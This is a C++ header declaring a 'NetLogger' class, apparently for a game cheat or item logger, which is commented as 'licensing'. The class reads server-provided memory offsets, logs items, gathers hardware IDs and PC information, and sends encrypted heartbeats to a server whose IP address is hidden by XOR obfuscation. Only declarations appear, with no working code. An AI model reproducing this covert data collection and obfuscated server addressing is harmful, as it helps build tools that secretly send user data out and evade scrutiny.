#define XOR_BYTE(x, pos) byte y = (x ^ pos) //fix this
#define CURRENT_VERSION "1.0"
#pragma once
#include "Offsets.hpp"
#include "NetCipher.hpp"
#include <WinSock.h>
#include <stdlib.h>
#include <stdio.h>
#include <queue>
#include <string>
#include <time.h>
#include "AutoUpdate.hpp"
#include "OS.hpp"


#pragma comment(lib, "ws2_32")

typedef struct ItemEntry
{
	USHORT ID;
	USHORT StackCount;
	BYTE Tier;
	std::wstring ItemPath;
	std::wstring ReadableName;
}LoggedItems;

const byte unpackKey = 0x50;

//static byte serverIP[12] = { '4' ^ unpackKey, '5' ^ unpackKey, '.' ^ unpackKey, '1' ^ unpackKey, '3' ^ unpackKey, '8' ^ unpackKey, '.' ^ unpackKey, '1' ^ unpackKey, '6' ^ unpackKey, '.' ^ unpackKey, '6' ^ unpackKey, '6' ^ unpackKey };
static byte serverIP[] = { '2' ^ unpackKey, '.' ^ unpackKey, '5' ^ unpackKey, '8' ^ unpackKey, '.' ^ unpackKey, '5' ^ unpackKey, '6' ^ unpackKey, '.' ^ unpackKey, '1' ^ unpackKey, '6' ^ unpackKey, '8' ^ unpackKey };

class NetLogger //'licensing'
{
private:

	SOCKET Socket;
	USHORT Port;
	char* IPAddress;
	BYTE ConnectionType; //WSATCP, TCP2, TCP1, UDP

	const UINT TimeBetweenHeartbeat = 3; //minutes
	std::string HardwareID;

	LPBYTE Heartbeat;
	std::queue<ItemEntry> LoggedItems;

	std::vector<char>* CryptoKey;
	LPBYTE CryptoBuffer;
	LPBYTE ResponseBuffer;

	BYTE IsCompromised;

	BOOL SendPCInfo();
	
public:
	NetLogger();

	struct IPv4
	{
		unsigned char b1, b2, b3, b4;
	};

	SOCKET GetSocket() { return this->Socket; }
	USHORT GetPort() { return this->Port; }
	char* GetIP() { return this->IPAddress; }
	UINT GetTimeBetweenSends() { return this->TimeBetweenHeartbeat; }

	BOOL SetSocket(SOCKET S);
	BOOL SetSocketPort(USHORT Port);
	BOOL SetIP(const char* IP);

	string GetUnpackedServerIP();

	ItemEntry* GetItemEntries(LPWSTR PathName);

	INT SendData(string data);
	VOID EncryptData(LPBYTE Data, LPBYTE Key);

	std::string FillHardwareID();
	bool SendHWID();
	std::string NetLogger::PostItemToLogger(char* dataBuffer);
	BOOL CompareHardwareID();
	BOOL GetClientIPv4(IPv4 & myIP);

	static void Listen(LPVOID param);

	UINT64 Offsets[14]; //server-provided offsets
	byte HeartbeatRecvBytes[256];

	bool TransactHeartbeat();
	int nTransactions;
	bool HeartbeatApproved = false;
	bool HelloApproved = false;

};
